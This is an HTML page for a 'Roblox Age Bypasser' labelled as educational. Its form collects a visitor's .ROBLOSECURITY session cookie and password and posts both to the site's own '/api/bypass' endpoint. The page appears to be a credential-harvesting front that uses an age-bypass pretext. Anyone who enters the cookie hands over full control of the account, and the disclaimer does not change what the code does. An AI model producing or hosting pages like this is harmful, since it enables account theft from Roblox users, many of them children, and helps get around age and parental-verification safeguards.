<!DOCTYPE html>
<html>
<head>
    <title>Roblox Age Bypasser (Educational)</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial; margin: 40px; background: #111; color: #eee; }
        input, button { padding: 10px; margin: 5px; background: #333; color: #fff; border: none; }
        button { background: #f00; cursor: pointer; }
        .warning { color: #ff8888; background: #330000; padding: 15px; border-radius: 5px; }
        pre { background: #222; padding: 10px; overflow-x: auto; }
    </style>
</head>
<body>
    <h1>⚠️ EDUCATIONAL DEMO ONLY ⚠️</h1>
    <div class="warning">
        This tool is for understanding Roblox API behavior. Do not use on real accounts.<br>
        Changing age from 13+ to under 13 requires parental verification. Removing email requires password and may still fail.
    </div>
    <h2>Enter credentials</h2>
    <input type="text" id="cookie" placeholder=".ROBLOSECURITY cookie" style="width: 300px;"><br>
    <input type="password" id="password" placeholder="Password"><br>
    <button onclick="runBypass()">Start Bypass</button>
    <pre id="output">Waiting...</pre>

    <script>
        async function runBypass() {
            const cookie = document.getElementById('cookie').value.trim();
            const password = document.getElementById('password').value;
            if (!cookie || !password) {
                alert("Please fill both fields");
                return;
            }
            document.getElementById('output').innerText = "Processing...\n";
            try {
                const response = await fetch('/api/bypass', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ cookie, password })
                });
                const data = await response.json();
                document.getElementById('output').innerText = JSON.stringify(data, null, 2);
            } catch (err) {
                document.getElementById('output').innerText = "Error: " + err.message;
            }
        }
    </script>
</body>
</html>
